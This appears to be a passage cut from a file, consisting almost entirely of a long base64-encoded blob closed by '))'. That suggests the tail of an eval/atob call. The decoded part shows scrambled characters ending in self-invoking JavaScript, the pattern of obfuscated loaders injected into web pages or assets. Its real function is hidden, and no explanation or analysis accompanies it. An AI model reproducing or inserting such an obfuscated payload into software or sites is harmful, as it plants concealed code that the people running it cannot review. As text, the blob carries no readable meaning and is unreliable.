0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
